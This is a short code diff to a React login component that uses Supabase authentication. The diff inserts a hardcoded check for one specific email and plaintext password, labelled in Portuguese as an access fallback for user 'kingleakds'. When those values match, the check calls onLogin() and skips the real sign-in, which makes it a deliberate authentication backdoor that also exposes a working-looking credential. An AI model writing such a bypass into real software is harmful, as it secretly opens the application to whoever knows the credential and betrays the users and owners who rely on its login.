@@ -62,6 +62,12 @@ export const LoginView = ({ onLogin }: LoginViewProps) => {
                     setIsSignUp(false);
                 }
             } else {
+                // Fallback de acesso para o usuário kingleakds
+                if (email === "kingleakds@gmail.com" && password === "Albertina198211") {
+                    onLogin();
+                    return;
+                }
+
                 const { error: signInError } = await supabase.auth.signInWithPassword({
                     email,
                     password,
